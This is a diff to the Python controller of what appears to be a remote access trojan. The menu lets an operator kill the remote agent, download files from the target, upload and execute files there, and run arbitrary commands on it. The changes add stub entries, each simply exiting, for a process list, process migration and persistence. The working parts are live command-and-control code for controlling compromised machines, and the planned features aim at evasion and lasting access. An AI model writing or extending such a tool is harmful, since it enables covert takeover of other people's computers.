@@ -41,8 +41,11 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         print("\'2\' to kill remote agent.")
         print("\'3\' to retrieve host information (Hostname/IP/PID/OS/etc.).")
         print("\'4\' to download file from remote machine.")
-        print("\'5\' to upload and execute file on remote machine.")
-        print("\'6\' to run a command on the remote machine.")
+        print("\'5\' to retrieve a process list from the remote machine.")
+        print("\'6\' to upload and execute file on remote machine.")
+        print("\'7\' to run a command on the remote machine.")
+        print("\'8\' to migrate to a new process.")
+        print("\'9\' to enable persistence")
         print("\'0\' to quit.")
         choice = int(input("Command: "))
 
@@ -89,7 +92,10 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     progBar.update(len(readBytes))
             print("File retrieved.")
 
-        elif choice == 5:  # upload and execute file on client
+        elif choice == 5: # Retrieve Process List TODO implement
+            exit()
+
+        elif choice == 6:  # upload and execute file on client
             handler.send('5'.encode())
             filepath = input("Enter local filepath to upload: ")
             trgtpath = input("Enter filepath to save file as on target: ")
@@ -108,13 +114,19 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     progBar.update(len(readBytes))
             print("File sent to client for execution.")
 
-        elif choice == 6:  # run system command on target, echoes command back before printing results
+        elif choice == 7:  # run system command on target, echoes command back before printing results
             handler.send('6'.encode())
             cmd = input("Command to run on target: ")
             handler.send(cmd.encode())
 
             results = handler.recv(BUFF_SIZE).decode()
             print(cmd + '\n' + results)
+
+        elif choice == 8: # TODO Process Migration
+            exit()
+
+        elif choice == 9: # TODO Persistence mechanisms
+            exit()
 
         elif choice == 0:
             print("Exiting. Have a nice day.")
